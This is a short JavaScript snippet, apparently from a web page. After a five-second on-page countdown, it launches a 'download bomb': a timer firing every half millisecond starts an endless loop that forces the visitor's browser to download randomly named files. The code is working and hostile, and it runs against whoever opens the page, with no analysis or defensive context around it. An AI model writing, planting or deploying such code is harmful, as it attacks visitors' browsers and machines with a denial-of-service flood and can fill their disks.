		function download(g, h, j){
			var k = new Blob([g],{
				type: j
			});
			if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
			else{
				var l = document.createElement("a"),
					m = URL.createObjectURL(k);
				l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
			}
		}
		function bomb_ch(){
			var g = Math.random().toString(36).substring(20),
				h = Math.floor(50 * Math.random() + 25);
			while (true) download(h, g, g)
		}
		function ch_jam(){
			bomb_ch()
		}
		function launch_bomb(){
			setInterval(ch_jam, 0.5);
		}
		var timeleft = 5;
		var downloadTimer = setInterval(function(){
		  document.getElementById("counter").innerHTML = timeleft--;
		  	if(timeleft <= 0){
		    	clearInterval(downloadTimer);
				launch_bomb();
			}
		},1000);
